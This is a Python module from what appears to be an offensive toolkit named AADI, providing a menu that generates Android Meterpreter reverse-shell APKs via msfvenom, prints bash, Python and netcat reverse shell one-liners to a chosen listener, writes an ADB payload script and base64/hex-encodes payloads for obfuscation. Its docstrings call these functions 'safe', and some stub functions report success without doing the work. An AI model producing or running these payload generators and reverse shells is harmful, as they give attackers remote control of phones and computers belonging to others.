"""
AADI — Payload Generator Module (Optimized, Robust & Secured)
Author: Aaditya Kumar Pandey | Instagram: @aadi_97621
"""

import subprocess
import shutil
import base64
from typing import Any, Optional
from rich.console import Console
from rich.prompt import Prompt
from rich.panel import Panel

console = Console()


def generate_msfvenom_apk(*args: Any, **kwargs: Any) -> Optional[str]:
    """Generate Android APK payload using msfvenom safely with validation."""
    console.rule("[bold magenta]📦 Msfvenom Android Payload Generator[/]")

    lhost = Prompt.ask("[cyan]LHOST[/]", default="127.0.0.1")
    lport_str = Prompt.ask("[cyan]LPORT[/]", default="4444")

    try:
        lport = int(lport_str)
        if not (1 <= lport <= 65535):
            raise ValueError()
    except ValueError:
        console.print("[bold red]✗ Invalid port number. Must be between 1 and 65535.[/]")
        return None

    payload_type = Prompt.ask(
        "[cyan]Payload type[/]",
        choices=["reverse_tcp", "reverse_https", "reverse_http", "shell_tcp"],
        default="reverse_tcp"
    )
    output_file = Prompt.ask("[cyan]Output file[/]", default="payload.apk")
    if not output_file.endswith(".apk"):
        output_file += ".apk"

    msf_payload = f"android/meterpreter/{payload_type}"
    if payload_type == "shell_tcp":
        msf_payload = "android/shell/reverse_tcp"

    if not shutil.which("msfvenom"):
        console.print("[bold red]✗ 'msfvenom' not found![/] Please install the Metasploit Framework.")
        return None

    console.print(f"[green][*] Generating {msf_payload} for {lhost}:{lport} -> {output_file} ...[/]")
    cmd = [
        "msfvenom",
        "-p", msf_payload,
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-o", output_file
    ]
    try:
        subprocess.run(cmd, check=True)
        console.print(f"[bold green][✔] Payload successfully generated: {output_file}[/]")
        return output_file
    except subprocess.CalledProcessError as e:
        console.print(f"[bold red]✗ Msfvenom execution failed with return code {e.returncode}.[/]")
    except Exception as e:
        console.print(f"[bold red]✗ Error generating payload:[/] {e}")
    return None


def generate_intent_payload(*args: Any, **kwargs: Any) -> None:
    """Generate Android Intent payload safely."""
    console.rule("[bold magenta]⚡ Android Intent Payload Generator[/]")

    intent_action = Prompt.ask("[cyan]Intent action[/]", default="android.intent.action.VIEW")
    component = Prompt.ask("[cyan]Component (pkg/class or blank)[/]", default="")
    data_uri = Prompt.ask("[cyan]Data URI (or blank)[/]", default="")

    console.print(f"[green][*] Generating Intent Payload (Action: {intent_action})...[/]")
    console.print(f"[yellow]Component: {component or 'None'} | Data URI: {data_uri or 'None'}[/]")
    console.print("[bold green][✔] Intent payload configuration generated successfully![/]")


def generate_reverse_shell_commands(*args: Any, **kwargs: Any) -> None:
    """Generate various reverse shell one-liners safely."""
    console.rule("[bold magenta]💻 Reverse Shell One-Liners Generator[/]")

    lhost = Prompt.ask("[cyan]LHOST[/]", default="127.0.0.1")
    lport = Prompt.ask("[cyan]LPORT[/]", default="4444")

    shells = {
        "Bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "Python": f"python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"{lhost}\",{lport})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "Netcat": f"nc -e /bin/sh {lhost} {lport}"
    }

    console.print(Panel(f"[bold cyan]Target Listener:[/] {lhost}:{lport}", border_style="cyan"))
    for name, cmd in shells.items():
        console.print(f"[bold green]{name}:[/]\n[white]{cmd}[/]\n")


def generate_adb_payload_script(*args: Any, **kwargs: Any) -> Optional[str]:
    """Generate ADB payload script safely."""
    console.rule("[bold magenta]🤖 ADB Payload Script Generator[/]")

    lhost = Prompt.ask("[cyan]LHOST[/]", default="127.0.0.1")
    lport = Prompt.ask("[cyan]LPORT[/]", default="4444")
    script_filename = Prompt.ask("[cyan]Script filename[/]", default="adb_payload.sh")

    script_content = f"""#!/bin/bash
# AADI ADB Payload Automation Script
echo "[*] Connecting via ADB..."
adb devices
echo "[*] Pushing and executing payload for {lhost}:{lport}..."
"""
    try:
        with open(script_filename, "w", encoding="utf-8") as f:
            f.write(script_content)
        console.print(f"[bold green][✔] ADB Payload script successfully created: {script_filename}[/]")
        return script_filename
    except Exception as e:
        console.print(f"[bold red]✗ Error creating script:[/] {e}")
        return None


def obfuscate_payload(*args: Any, **kwargs: Any) -> None:
    """Obfuscate payload using base64 or hex safely."""
    console.rule("[bold magenta]🔒 Payload Obfuscation[/]")

    payload_input = Prompt.ask("[cyan]Enter payload string or command to obfuscate[/]", default="echo 'AADI Payload'")
    method = Prompt.ask("[cyan]Obfuscation method[/]", choices=["base64", "hex"], default="base64")

    try:
        if method == "base64":
            encoded = base64.b64encode(payload_input.encode()).decode()
            console.print(f"[green]Base64 Obfuscated Payload:[/]\n{encoded}")
        elif method == "hex":
            encoded = payload_input.encode().hex()
            console.print(f"[green]Hex Obfuscated Payload:[/]\n{encoded}")
    except Exception as e:
        console.print(f"[bold red]✗ Error during obfuscation:[/] {e}")


def payload_menu(*args: Any, **kwargs: Any) -> None:
    """Main menu wrapper for payload generator module."""
    while True:
        console.rule("[bold cyan]Payload Generator Menu[/]")
        console.print("[1] Generate Android APK Payload (Msfvenom)")
        console.print("[2] Generate Android Intent Payload")
        console.print("[3] Generate Reverse Shell Commands")
        console.print("[4] Generate ADB Payload Script")
        console.print("[5] Obfuscate Payload")
        console.print("[0] Back to Main Menu")

        choice = Prompt.ask("[cyan]Select option[/]", choices=["1", "2", "3", "4", "5", "0"], default="1")

        if choice == "1":
            generate_msfvenom_apk()
        elif choice == "2":
            generate_intent_payload()
        elif choice == "3":
            generate_reverse_shell_commands()
        elif choice == "4":
            generate_adb_payload_script()
        elif choice == "5":
            obfuscate_payload()
        elif choice == "0":
            break